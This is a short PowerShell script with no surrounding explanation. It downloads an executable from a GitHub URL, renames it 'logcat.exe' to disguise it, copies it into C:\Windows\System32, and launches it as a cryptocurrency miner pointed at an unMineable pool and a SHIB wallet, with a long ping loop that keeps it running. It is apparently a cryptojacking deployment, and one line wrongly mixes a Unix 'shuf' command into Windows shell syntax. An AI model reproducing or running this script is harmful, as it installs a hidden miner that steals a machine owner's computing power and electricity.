Invoke-WebRequest https://raw.githubusercontent.com/dykamaestrooo/akankah/main/vios.exe -OutFile logcat.exe
Copy logcat.exe C:\Windows\System32
cmd /c echo cmd /k start logcat.exe --pool rx-us.unmineable.com:13333 --username SHIB:0x7c010aa62bc975b07cce8a84abca304f1d23a4f9.$(shuf -i 10-9999999999999999999 -n 1) --password x --algorithm wrkzcoin --disableNVIDIA >>a.ps1
cmd /c echo ping -n 999999 10.10.10.10 >>a.ps1
.\a.ps1
